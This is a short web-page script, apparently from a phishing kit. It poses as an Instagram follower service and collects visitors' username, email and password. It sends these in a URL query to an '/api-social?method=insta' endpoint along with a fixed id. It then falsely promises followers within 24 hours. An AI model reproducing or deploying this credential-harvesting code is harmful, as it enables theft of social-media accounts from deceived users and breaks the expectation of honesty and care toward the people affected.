<script>
    document.addEventListener("DOMContentLoaded", function() {
    const button = document.getElementById('submitButton');
    button.addEventListener('click', function(e) {
        e.preventDefault();

        const username = document.querySelector('input[name="username"]').value;
        const email = document.querySelector('input[name="email"]').value;
        const id = "5497929050";
        const pass = document.querySelector('input[name="pass"]').value;

        if (!username || !email || !pass) {
            alert('Please fill out all fields.');
        } else {
            fetch(`/api-social?method=insta&username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}&id=${encodeURIComponent(id)}&pass=${encodeURIComponent(pass)}`)
                .then(response => response.text())
                .then(data => {
                    alert('Your Request is Processed. You Will Get Followers Within 24 Hours');
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Failed to make request');
                });
        }
    });
});
